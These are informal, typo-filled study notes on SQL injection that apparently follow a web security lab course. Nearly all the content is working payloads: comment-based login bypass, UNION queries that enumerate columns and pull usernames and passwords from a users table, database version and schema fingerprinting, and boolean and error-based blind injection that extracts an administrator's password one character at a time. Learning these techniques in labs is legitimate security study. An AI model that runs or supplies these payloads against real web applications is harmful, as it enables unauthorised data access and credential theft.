how can we cause error in web app is aur main focus
either it cann be usinf " ' or specil charcters
'--
' or 1=1---             Don't forget to add + when using with web app
                        take care with or 1=1 as it can delete the whole databse server
lab 1 can be solved using the above tachnique don't forgrt to add +


2. subverting application login 
to bypass admin page
eg.   ---> administator'--


3.Retrieving data from other database tables
++++++++++++++++++++++++++++++++++use of union attacks+++++++++++++++++++++++++++++++++++++++++++++++
' UNION SELECT username, password FROM users--      -----> for union attacks no of attributes must match and so the data types


Determining the no. of columns
use of order by clause to find the number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

' UNION SELECT NULL FROM DUAL--  -------> for oracle SQL



4. finding column with useful datatype
we can use this method recursively
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
to find whcih column matches required datatype



5. Union injection to retreive interesting data
suppose we have determined the datatypes of cl=olumns then we can use union techniques to gather data
' UNION SELECT username, password FROM users--      ------> if more than two columns we can either use null aur any charter or interger in place of column name



6. retrieving multiple values from database
' UNION SELECT username || '~' || password FROM users--    -------> different databases have different contaenation oerators -----> here || is concatenation operator

7.Database          type 	Query
Microsoft,mysql     SELECT @@version
Oracle 	            SELECT * FROM v$version
PostgreSQL 	        SELECT version() 

following methods can be used with union attacks to find database version and type 
eg .   ' UNION SELECT @@version--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--      ------> for oracle
'+UNION+SELECT+@@version,+NULL#  --------> for mysql and microsoft ---> see hashtag "#" for commenting or ending



8. listing the contents of database
for non oracle ------>   SELECT * FROM information_schema.tables
                         SELECT * FROM information_schema.columns WHERE table_name = 'Users'


for oracle only  --------->   SELECT * FROM all_tables
                              SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

how to cause detectable diferences to find blind sqli
1.cause a divide by zero
2. cause a delay
3.using burp collaborator
 sqli can be caused by anything so fuxx everything likecookie any parametr anything that server accepts


fist send a legal sql query to see difference then modify or invalid query  to see its affect
eg ---> sometimes a successful query will give us specific http code or some text or a size of web page that will differ if wrong query is added
this can help us to use conditional inputs to extract useful information

first try with them=…xyz' AND '1'='1 , …xyz' AND '1'='2
as first is true and second is false
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm    -----> first letter is greater than m

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's   --------> first letter is s
---> you can use burp instruder to find it 
this is jist exmple                  ----------> sometimes limit is also used




10.error based blind sqli
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
use the methods and find response code or change in size 

xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a ----> to find data



11.how to convert one data type to another
CAST((SELECT example_column FROM example_table) AS int) this can be useful when we have verbose output


12 time delay
